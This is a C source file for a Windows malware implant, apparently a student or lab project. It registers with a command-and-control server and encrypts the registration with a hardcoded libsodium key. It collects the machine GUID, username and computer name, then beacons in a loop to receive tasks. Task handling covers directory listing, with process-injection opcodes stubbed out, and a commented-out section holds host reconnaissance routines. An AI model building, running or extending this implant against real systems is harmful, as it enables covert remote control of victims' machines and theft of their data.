#define PB_ENABLE_MALLOC 1
#include "include/debug.h"
#include "implant.h"
#include <windows.h>
#include "include/execute.h"
#include "include/httpclient.h"
#include "list_directory.h"
//#include "http_client.h"
#include <stdio.h>
#include <string.h>
#include <iphlpapi.h>
#include <pb_encode.h>
#include <pb_decode.h>
#include "implant.pb.h"
#include "opcodes.h"

#include <sodium.h>
#include <iphlpapi.h>

// Server's public key hardcoded - implants will use this to encrypt the initial registration message
unsigned char server_public_key[] = {
    0x75, 0x44, 0x89, 0x0c, 0x9f, 0x96, 0xaf, 0xde,
    0x9e, 0x10, 0x3a, 0xd9, 0x55, 0xaf, 0xac, 0xd4,
    0xe1, 0x63, 0x8d, 0x15, 0xba, 0x39, 0x81, 0xb7,
    0x7a, 0x27, 0x26, 0xc7, 0x79, 0xb0, 0x33, 0x75
};

LPBYTE ImplantID_PT1 = NULL; // MachineGUID
LPBYTE ImplantID_PT2 = NULL; // RandomBytes
LPBYTE ImplantID = NULL; // MachineGUID + RandomBytes

// Function to RegisterImplant message
BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
	bool status = pb_get_encoded_size(bufferSize, RegisterImplant_fields, ri);
	if (!status) {
		DEBUG_PRINTF("Failed to get RegisterImplant size: \n");
		return NULL;
	}
	
	BYTE *registerBuffer = (BYTE *)malloc(*bufferSize);
	pb_ostream_t stream = pb_ostream_from_buffer(registerBuffer, *bufferSize);
	
	status = pb_encode(&stream, RegisterImplant_fields, ri);
	
	if (!status) {
		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
		free(registerBuffer);
		return NULL;
	}

        // DEBUG_PRINTF("[+] Successfully encoded: %llu\n", stream.bytes_written);
	return registerBuffer;
}

// Function to encode the ImplantCheckin message
BYTE *EncodeImplantCheckin(ImplantCheckin *ic, size_t *bufferSize) {
  bool status = pb_get_encoded_size(bufferSize, ImplantCheckin_fields, ic);
  if (!status) {
    DEBUG_PRINTF("Failed to get ImplantCheckin size: \n");
    return NULL;
  }

  BYTE *checkinBuffer = (BYTE *)malloc(*bufferSize);
  pb_ostream_t stream = pb_ostream_from_buffer(checkinBuffer, *bufferSize);

  status = pb_encode(&stream, ImplantCheckin_fields, ic);
  if (!status) {
    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
    free(checkinBuffer);
    return NULL;
  }

  return checkinBuffer;
}

// Decode TaskRequest message
BOOL DecodeTaskRequest(LPBYTE result, size_t outboundBufferSize, TaskRequest *tReq) {
  pb_istream_t stream = pb_istream_from_buffer(result, outboundBufferSize);
  bool status = pb_decode(&stream, TaskRequest_fields, tReq);
  if (!status) {
    DEBUG_PRINTF("Decoding failed: %s\n", PB_GET_ERROR(&stream));
    return FALSE;
  }
  return TRUE;
}

// Free given TaskResponse
void FreeTaskResponse(TaskResponse *tResp) {
  if (tResp->Response != NULL) {
    free(tResp->Response);
    tResp->Response = NULL;
  }
}

// Function to encode the TaskResponse message
BYTE *EncodeTaskResponse(TaskResponse *tr, size_t *stBuffSize) {
  bool status = pb_get_encoded_size(stBuffSize, TaskResponse_fields, tr);
  if (!status) {
    DEBUG_PRINTF("Failed to get TaskReponse size: \n");
    return NULL;
  }

  BYTE *trBuffer = (BYTE *)malloc(*stBuffSize);
  pb_ostream_t stream = pb_ostream_from_buffer(trBuffer, *stBuffSize);

  status = pb_encode(&stream, TaskResponse_fields, tr);
  if (!status) {
    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
    free(trBuffer);
    return NULL;
  }

  return trBuffer;
}

int GetMachineGUID() {
	DWORD dwSize = 0;

	RegGetValueA(HKEY_LOCAL_MACHINE,
                        "SOFTWARE\\Microsoft\\Cryptography",
                        "MachineGuid",
                        RRF_RT_REG_SZ,
                        NULL,
                        NULL,
                        &dwSize);
	
	ImplantID_PT1 = malloc(dwSize);

	LONG res = RegGetValueA(HKEY_LOCAL_MACHINE,
			"SOFTWARE\\Microsoft\\Cryptography",
			"MachineGuid",
			RRF_RT_REG_SZ,
			NULL,
			ImplantID_PT1,
			&dwSize);

	if (res) {
		DEBUG_PRINTF("Failed to get MachineGUID\n");
		return 1;
	}
	return 0;
}

BYTE *GenerateRandomBytes() {
	HCRYPTPROV hCryptProv;
	
	if (!CryptAcquireContext(&hCryptProv,
				NULL,
				NULL,
				PROV_RSA_FULL,
				CRYPT_VERIFYCONTEXT)) {
		DEBUG_PRINTF("Error acquiring cryptographic context.\n");
		return NULL;
	}

	BYTE *randomBytes = (BYTE *)malloc(RANDOM_BYTES_SIZE);
	if (!CryptGenRandom(hCryptProv,
				RANDOM_BYTES_SIZE,
				randomBytes)) {
		DEBUG_PRINTF("Error generating random bytes.\n");
		CryptReleaseContext(hCryptProv, 0);
		return NULL;
	}
	CryptReleaseContext(hCryptProv, 0);

	return randomBytes;
}

int BytesToHexString(const BYTE *bytes) {
	if (bytes == NULL) {
		return 1;
	}
	
	ImplantID_PT2 = malloc(HEX_STRING_SIZE);
	const char *hexChars = "0123456789abcdef";
	for (int i = 0; i < RANDOM_BYTES_SIZE; i++) {
		ImplantID_PT2[i * 2] = hexChars[bytes[i] >> 4];
		ImplantID_PT2[i * 2 + 1] = hexChars[bytes[i] & 0x0F];
	}
	ImplantID_PT2[HEX_STRING_SIZE - 1] = '\0';

	return 0;
}

char* concat(const char *s1, const char *s2) {
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}

// Function to set the ImplantID using the machine's GUID
char *SetID() {

	if (GetMachineGUID() == 1) {
		DEBUG_PRINTF("MachineID is not set...\n");
	}

	if (BytesToHexString(GenerateRandomBytes()) == 1) {
		DEBUG_PRINTF("RandomBytes is NULL...\n");
        }

	// DEBUG_PRINTF("ImplantID_PT1 = %s\n", ImplantID_PT1);
	// DEBUG_PRINTF("ImplantID_PT2 = %s\n", ImplantID_PT2);

	ImplantID = (LPBYTE )concat((const char *)ImplantID_PT1, (const char *)ImplantID_PT2);

	return (char *)ImplantID;
}


// Function to register Implant with the Server
int RegisterSelf() {

    if (sodium_init() == -1) {
        printf("libsodium initialization failed.\n");
        return 1;
    }

    //key pair for the implant
    unsigned char implant_pk[crypto_box_PUBLICKEYBYTES];  // Public key
    unsigned char implant_sk[crypto_box_SECRETKEYBYTES];  // Secret key
    crypto_box_keypair(implant_pk, implant_sk);

    char public_key_base64[crypto_box_PUBLICKEYBYTES * 2]; 
    sodium_bin2base64(public_key_base64, sizeof(public_key_base64), implant_pk, sizeof(implant_pk), sodium_base64_VARIANT_ORIGINAL);

	RegisterImplant ri = RegisterImplant_init_zero;

	ri.ImplantID = SetID();
    // ImplantID = (LPBYTE) "TEST";
    // ri.ImplantID = "TEST";
	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.ImplantID);

	DWORD usernameSize = MAX_PATH;
	DWORD computerNameSize = MAX_PATH;
	char username[MAX_PATH];
	GetUserNameA(username, &usernameSize);
	char computerName[MAX_PATH];
	GetComputerNameA(computerName, &computerNameSize);
	ri.ComputerName = computerName;
	ri.Username = username;
	DEBUG_PRINTF("COMPUTER NAME = %s\n", ri.ComputerName);
	DEBUG_PRINTF("USERNAME = %s\n", ri.Username);

	ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";

    // ri.PublicKey = public_key_base64;
    ri.PublicKey = public_key_base64;
    printf("PUBLICKEY = %s\n", ri.PublicKey);


	size_t outboundBufferSize = 0;
    size_t inboundBufferSize = 0;
	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &outboundBufferSize);
    DEBUG_PRINTF("outboundBufferSize = %llu\n", outboundBufferSize);
    DEBUG_PRINTF("outboundBuffer = %s\n", registerBuffer);

    //Encrypt the buffer using the server's public key
    unsigned char ciphertext[crypto_box_SEALBYTES + outboundBufferSize];
    if (crypto_box_seal(ciphertext, registerBuffer, outboundBufferSize, server_public_key) != 0) {
        printf("Failed to encrypt registration info\n");
        free(registerBuffer);
        return 1;
    }
    free(registerBuffer);

    //Encode the ciphertext using Base64 encoding
    size_t base64_maxlen = sodium_base64_ENCODED_LEN(sizeof(ciphertext), sodium_base64_VARIANT_ORIGINAL);
    char *base64_ciphertext = malloc(base64_maxlen);
    if (base64_ciphertext == NULL) {
        printf("Error allocating memory for Base64\n");
        return 1;
    }
    if (sodium_bin2base64(base64_ciphertext, base64_maxlen, ciphertext, sizeof(ciphertext), sodium_base64_VARIANT_ORIGINAL) == NULL) {
        printf("Error encoding ciphertext to Base64\n");
        free(base64_ciphertext);
        return 1;
    }

    // Send the Base64 encoded ciphertext to the server
    size_t encryptedSize = strlen(base64_ciphertext);
    printf("Base64 encoded ciphertext: %s\n", base64_ciphertext);
	//LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, outboundBufferSize, &inboundBufferSize);
    LPBYTE response = HTTPRequest(POST_VERB, C2_HOST, REGISTER_PATH, C2_PORT, C2_UA,
                              (LPBYTE)base64_ciphertext, encryptedSize, &inboundBufferSize, USE_TLS);
    if (response != NULL) {
        DEBUG_PRINTF("Register Sent!\n");
        free(base64_ciphertext);
        return 0;
    }
    /**
	if (strcmp((const char *)response, (const char *)REGISTRATION_SUCCESSFUL)){
		return 0;
        }
        */
	if (response) {
        free(response);
    }
	return 1;
}

// Check-in with Server
BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
	
	ImplantCheckin ic = ImplantCheckin_init_zero;
	ic.ImplantID = (char *)ImplantID;
	//size_t trBufferSize = 0;
	ic.Resp = tResp;
	//EncodeTaskResponse(tResp, &trBufferSize);

	size_t outboundBufferSize = 0;
	size_t inboundBufferSize = 0;
	BYTE *outboundBuffer = EncodeImplantCheckin(&ic, &outboundBufferSize);
	DEBUG_PRINTF("OUTBOUND BUFFER = %s\n", outboundBuffer);
	// LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);

	LPBYTE response = HTTPRequest(POST_VERB, C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);

	/*
	if (response != NULL) {
		DEBUG_PRINTF("Register Sent!\n");
		free(response);
		return TRUE;
	}*/

	// FreeTaskResponse(tResp);
	// free(outboundBuffer);
	/**if (response != NULL) {
		DEBUG_PRINTF("RESPONSE IS NOT NULL. SIZE IS %llu.\n", inboundBufferSize); 
		DEBUG_PRINTF("RESPONSE IS: **%s**\n", response);
	}**/
	
	if (inboundBufferSize > 0) {
		BOOL status = DecodeTaskRequest(response, inboundBufferSize, tReq);
		
		DEBUG_PRINTF("TREQ:\n");
		//DEBUG_PRINTF("    - TaskID = %ld\n", *tReq->TaskID);
		//DEBUG_PRINTF("    - TaskID = %ld\n", *tReq->Opcode);
		DEBUG_PRINTF("    - Args = %s\n", tReq->Args);

		if (status && tReq->TaskID == NULL) {
			// No task to perform, null out the TaskResponse
			memset(tResp, 0, sizeof(TaskResponse));
		}
		free(response);
		return status;
	}
	
	if (response) {
		free(response);
	}

	return FALSE;
}

BOOL StdlibOperation(TaskRequest *tr, char** data, size_t *dataSize)
{
	DEBUG_PRINTF("%s\n", tr->Args);
	int stdlib_opcode = (int)tr->Args[0];
	DEBUG_PRINTF("%d\n", stdlib_opcode);
	memmove(tr->Args, tr->Args+1, strlen(tr->Args));
	DEBUG_PRINTF("ARGS = %s\n", tr->Args);

    switch (stdlib_opcode)
    {

    case 49:
        *data = listdirs(tr->Args);
	*dataSize = strlen(*data);	
	break;

    case 2:
        //data = readfile(args);
        break;

    case 3:
        //data = getdir();
        break;

    case 4:
        //data = removefile(args);
        break;

    case 5:
        //data = makedirectory(args);
        break;

    case 6:
        //data = changedir(args);
        break;

    case 7:
        //data = whoami(args);
        break;

    default:
        break;
	return false;
    }
    return true;
}

// Function to handle the opcode received from the C2 server
int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
	printf("OPCODE = %d\n", tr->Opcode);

	bool Success = false;
	printf("SUCCES = FALSE\n");

	switch (tr->Opcode)
        {
        case OPCODE_NOTASK:
            // no task, just sleep an check in later
            Success = true;
            break;

        case OPCODE_INJECT_EX_CODE:
            // inject shellcode into a running process
            //Success = InjectExecuteCode(Buffer);
            break;

        case OPCODE_SPAWN_EXECUTE:
            // spawn a process and inject code into its main thread
            //Success = SpawnExecuteCode(Buffer);
            break;

        case OPCODE_STDLIB: ;
            // stdlib command so lets run it
	    size_t outputSize = 0;
	    char* output = malloc(4096);
	    // Directory size can't be bigger than page. Womp womp.
	    Success = StdlibOperation(tr, &output, &outputSize);
	    if (Success) {
		    tResp->TaskID = tr->TaskID;
		    tResp->ImplantID = (char *) ImplantID;
		    DEBUG_PRINTF("OUTPUT: %s\n", output);
		    pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(outputSize));
		    
		    bytes_array->size = outputSize;
		    memcpy(bytes_array->bytes, output, outputSize);
		    tResp->Response = bytes_array;
		    //DEBUG_PRINTF("bytes_array->size = %d\n", bytes_array->size);
		    //DEBUG_PRINTF("bytes_array->bytes = %s\n", bytes_array->bytes);
	    }
	    free(output); 
            break;

        case OPCODE_INJECT_EX_DLL:
            // inject a dll into a running process
            //Success = InjectExecuteDll(Buffer);
            break;

        case OPCODE_RIP_C2:
            // beacon will die
            return 2;
        }

        if (!Success)
        {
            // ReportExecutionFail();
	    return 1;
        }
	
	return 0;
}

int main() {
    MessageBoxA(NULL,
        (LPCSTR)L"Malware Downloaded",
        (LPCSTR)L"Account Details",
        MB_OK);
	DEBUG_PRINTF("[+] Starting Implant.\n");
	
	if (RegisterSelf() == 1) {
		DEBUG_PRINTF("[!] Failed to register with the Server!\n");
		return 1;
	}
	printf("[+] Successfully registered Implant with Server!\n");

	TaskRequest tReq = TaskRequest_init_zero;
	TaskResponse tResp = TaskResponse_init_zero;
	
	while (1) {
		DEBUG_PRINTF("[+] Sleeping for %d milliseconds \n", SLEEP_TIME);
		Sleep(SLEEP_TIME);
		
		if (DoCheckin(&tResp, &tReq) && tReq.TaskID != NULL) {
			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
			int result = HandleOpcode(&tReq, &tResp);
			DEBUG_PRINTF("FINAL RESULT = %d\n", result);
			DEBUG_PRINTF("%llu\n", sizeof(tResp.Response));
		} else {
			// No task to perform, null out the TaskResponse
			memset(&tResp, 0, sizeof(TaskResponse));
		}
	}
	
	// Free the final task response before exiting
	FreeTaskResponse(&tResp);
	return 0;
}

/**
//SITUATIONAL AWARENESS

// Function to gather and print environment variables

//read environment variables
void getEnvironmentVariables() {
    // Pointer to hold the environment variables
    LPTSTR lpEnvironment = GetEnvironmentStrings();
    if (lpEnvironment == NULL) {
        printf("Failed to retrieve environment variables\n");
        return;
    }

    // Iterate over each environment variable
    LPTSTR lpszVariable = lpEnvironment;
    while (*lpszVariable != TEXT('\0')) {
        // Find the end of the variable name and the beginning of its value
        LPTSTR lpszEqualSign = _tcschr(lpszVariable, TEXT('='));
        if (lpszEqualSign != NULL) {
            // Copy the variable name
            TCHAR variable[MAX_PATH];
            int length = lpszEqualSign - lpszVariable;
            _tcsncpy_s(variable, MAX_PATH, lpszVariable, length);
            variable[length] = TEXT('\0');

            // Print the variable name and value
            _tprintf(TEXT("%s: %s\n"), variable, lpszEqualSign + 1);
        }

        // Move to the next environment variable
        lpszVariable += lstrlen(lpszVariable) + 1;
    }

    // Free the environment block
    FreeEnvironmentStrings(lpEnvironment);
}


// Function to gather and print network interfaces
void getNetworkInterfaces() {
    // Variable to store the result of the GetAdaptersAddresses function
    ULONG result = 0;

    // Variable to hold the buffer size needed for the adapter information
    ULONG buffer_size = 0;

    // Call GetAdaptersAddresses with a NULL buffer to get the required buffer size
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &buffer_size);
    if (result != ERROR_BUFFER_OVERFLOW) {
        printf("Error getting buffer size for adapter information\n");
        return;
    }

    // Allocate memory for the adapter information buffer
    IP_ADAPTER_ADDRESSES *adapter_addresses = (IP_ADAPTER_ADDRESSES *)malloc(buffer_size);
    if (adapter_addresses == NULL) {
        printf("Memory allocation failed for adapter information\n");
        return;
    }

    // Call GetAdaptersAddresses again to retrieve the adapter information
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &buffer_size);
    if (result != NO_ERROR) {
        printf("Error getting adapter information\n");
        free(adapter_addresses);
        return;
    }

    // Iterate over the adapter information and print relevant details
    for (IP_ADAPTER_ADDRESSES *adapter = adapter_addresses; adapter != NULL; adapter = adapter->Next) {
        printf("Adapter Name: %ws\n", adapter->AdapterName);
        printf("Description: %ws\n", adapter->Description);
        printf("IPv4 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Address.lpSockaddr != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("IPv6 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Next != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Next->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("\n");
    }

    // Free the memory allocated for the adapter information
    free(adapter_addresses);
}

//get the windows version 
void getSystemVersion() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (GetVersionEx((OSVERSIONINFO *)&osvi)) {
        printf("Operating System Version: %d.%d\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
        printf("Build Number: %d\n", osvi.dwBuildNumber);
    } else {
        printf("Failed to retrieve system version information.\n");
    }
}

//to get the current user and token (is this getting the token??)
void getCurrentUser() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    if (GetUserName(username, &username_len)) {
        printf("Current User: %s\n", username);
    } else {
        printf("Failed to retrieve current user information.\n");
    }
}

// Function to get computer name
void getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1]; 
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerName(computerName, &size)) {
        printf("Computer Name: %s\n", computerName);
    } else {
        printf("Failed to retrieve computer name.\n");
    }
}

//get machine GUID
void getMachineGUID() {
    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfileA(&hwProfileInfo) != NULL) {
        printf("Machine GUID: %s\n", hwProfileInfo.szHwProfileGuid);
    } else {
        printf("Failed to retrieve machine GUID\n");
    }
}

// Function to list files in a directory
void listFilesInDirectory(const char *path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    // Prepare the search path
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    // Find the first file in the directory
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error opening directory: %s\n", path);
        return;
    }

    // Iterate through all files in the directory
    do {
        // Skip directories
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("%s\n", findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    // Close the search handle
    FindClose(hFind);
}

//change current directory
bool ChangeDirectory(const char *path) {
    if (SetCurrentDirectory(path)) {
        return true; // Directory change successful
    } else {
        return false; // Directory change failed
    }
}

// Function to enumerate and print running processes
void listRunningProcesses() {
    DWORD count;
    PWTS_PROCESS_INFOA pProcessInfo;

    // Get the list of processes on the terminal server
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &count)) {
        printf("Failed to enumerate processes on terminal server\n");
        return;
    }

    // Iterate through the processes and print information
    for (DWORD i = 0; i < count; i++) {
        printf("Process ID: %d, Session ID: %d, Process Name: %s\n",
               pProcessInfo[i].ProcessId, pProcessInfo[i].SessionId, pProcessInfo[i].pProcessName);
    }

    // Free the memory allocated for the process information
    WTSFreeMemory(pProcessInfo);
}

**/
